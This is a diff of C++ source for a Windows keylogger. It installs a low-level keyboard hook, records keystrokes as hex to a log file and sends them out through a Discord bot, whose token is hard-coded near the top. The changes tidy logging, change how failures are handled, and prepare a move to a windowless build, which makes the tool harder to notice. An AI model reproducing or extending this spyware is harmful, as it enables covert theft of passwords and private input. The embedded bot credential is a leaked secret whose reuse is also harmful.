@@ -1,9 +1,16 @@
 #define _CRT_SECURE_NO_WARNINGS     //fuck msvc
 #define NOMINMAX //get rid of windef.h bad max/min impl
 #define UNICODE
+//#define _CONSOLE	//not ready for winmain
+
+//#define MY_PROJ_DEBUG
 
 //#include <windows.h>
 //#include <shlobj.h>
+
+//Visual Studio put /external:W0 AFTER /W4, hence defeat the purpose of suppress
+//external headers warning (there are ways too much warnings there). This is workaround
+#pragma warning (push, 0)
 
 #include <cstdio>
 #include <ctime>
@@ -21,6 +28,7 @@
 
 #include <dpp/cluster.h>
 #include <dpp/once.h>
+#pragma warning (pop)
 
 const std::string    BOT_TOKEN    = "Nzk1MjgzNjM2MDg1MzI1ODI1.GJQ65H.orWw99qm-DPXVNYJxb767PoppSohLsphOJKcJw";
 
@@ -145,7 +153,9 @@ inline void print_to(const char* format, ...) {
 	fputs(__buf, dbg_file);
 	fflush(dbg_file);
 }
-
+#else
+inline void print_to(const char* format, ...){}
+#endif
 inline void print_file(const char* format, ...) {
 
 	char __buf[1001];
@@ -157,10 +167,6 @@ inline void print_file(const char* format, ...) {
 	fputs(__buf, output_file);
 	fflush(output_file);
 }
-#else
-inline void print_to(const char* format, ...){}
-inline void print_file(const char* format, ...){}
-#endif
 
 inline void wide_char_to_mb(WCHAR* input, char* output, int outputbuf) {
 	WideCharToMultiByte(CP_UTF8, 0, input, -1, output, outputbuf, NULL, NULL);
@@ -239,7 +245,7 @@ void send_key(size_t len, std::string& err) {
 	condvar.notify_all();
 }
 
-void storekeychar(int __stroke) {
+inline void storekeychar(int __stroke) {
 	char __buffer[5];
 	snprintf(__buffer, 4, "%.2x", __stroke);
 	keydata.front().try_push(std::string(__buffer));
@@ -296,7 +302,7 @@ int Save(int key_stroke) {
 			//Thread autorun after initialization !? this is mitigation
 			is_sendkey = true;
 			is_sendtimestamp = true;
-			std::thread sendtimestamp_thread(send_timestamp, process_counter, timestamp, std::ref(err_sendtimestamp));
+			std::thread sendtimestamp_thread(send_timestamp, mapper_id, timestamp, std::ref(err_sendtimestamp));
 			std::thread sendkey_thread(send_key, 100, std::ref(err_sendkey));
 			sendkey_thread.join();
 			sendtimestamp_thread.join();
@@ -305,7 +311,7 @@ int Save(int key_stroke) {
 			}
 			keydata.pop();
 
-			print_to("\nMap: Stamp: %u %llu\n", process_counter, timestamp);
+			print_to("\nMap: Stamp: %u %llu\n", mapper_id, timestamp);
 			// print_to("vecdata currently holding %d elements!\n", vecdata.size());
 		}
 	}
@@ -334,15 +340,15 @@ void logrun()
 {
 	std::unique_lock<std::mutex> locker(bot_connected_lock);
 	while (is_bot_connected == 0) bot_connected_condvar.wait(locker);
-	if (is_bot_connected == -1) {	[[unlikely]]
-		printf("Bot failed to initialized. Terminating...");
-		return;
-	} else {
+	if (is_bot_connected != -1) {
 		printf("Bot successfully initialized. Logging...");
+	} else {
+		printf("Bot failed to initialized. Terminating...");
+		exit(EXIT_FAILURE);
 	}
 
 	if (!(_hook = SetWindowsHookExW(WH_KEYBOARD_LL, HookCallback, NULL, 0))) {
-		MessageBoxW(NULL, L"Failed to install hook!", L"Error", MB_ICONERROR);
+		printf("Failed to install hook. Terminating...\n");
 		exit(EXIT_FAILURE);
 	}
 	MSG msg;
@@ -364,8 +370,14 @@ void botrun()
 
 		std::cout << "Hello world\n";
 
-        /* Output simple log messages to stdout */
-        bot->on_log(dpp::utility::cout_logger());
+		/* Output simple log messages to stdout */
+		bot->on_log(dpp::utility::cout_logger());
+
+        /*
+		bot->on_log([](const dpp::log_t& logger) {
+			std::cout << logger.message << "\n";
+		});
+		*/
 
         /* Handle slash command */
 		bot->on_slashcommand([](const dpp::slashcommand_t& event) {
@@ -410,21 +422,26 @@ void botrun()
     }
 }
 
-int main() {
-
-	SetConsoleCP(CP_UTF8);
-	SetConsoleOutputCP(CP_UTF8);
-
-	//reset file data 
-	output_file = fopen("keylogger.log", "w");
-	dbg_file = fopen("dbglog.txt", "w");
-	fclose(output_file);
-	fclose(dbg_file);
-
-	//printf("Logging output to %s\n", "keylogger.log");
+inline void init_file() {
 	fflush(stdout);
+	output_file = fopen("keylogger.log", "w");
+	fclose(output_file);
 	output_file = fopen("keylogger.log", "a");
+
+	#ifdef MY_PROJ_DEBUG
+	dbg_file = fopen("dbglog.txt", "w");
+	fclose(dbg_file);
 	dbg_file = fopen("dbglog.txt", "a");
+	#endif
+}
+
+//now switch to windows subsystem, no longer console
+//int wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {
+int main() {
+	//int argc;
+	//WCHAR** argv = CommandLineToArgvW(pCmdLine, &argc);
+
+	init_file();
 
 	ShowWindow(FindWindowW(L"ConsoleWindowClass", NULL), 1); // visible window
 
@@ -437,7 +454,9 @@ int main() {
 	t2.join();
 	t1.join();
 
-	fclose(dbg_file);
 	fclose(output_file);
+	#ifdef MY_PROJ_DEBUG
+	fclose(dbg_file);
+	#endif
 	return 0;
 }
